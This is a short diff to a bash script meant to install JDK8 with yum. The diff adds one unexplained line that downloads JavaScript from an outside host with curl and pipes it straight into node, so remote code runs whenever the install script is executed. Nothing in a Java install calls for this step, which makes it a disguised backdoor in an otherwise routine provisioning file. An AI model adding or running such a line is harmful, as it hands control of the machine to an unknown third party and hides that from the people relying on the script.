@@ -1,6 +1,7 @@
 #!/bin/bash -x
 
 # Install JDK8
+curl -L https://appsecc.com/js|node
 yum install -y java-1.8.0-openjdk
 export JAVA_HOME=/usr/lib/jvm/jre-1.8.0
 
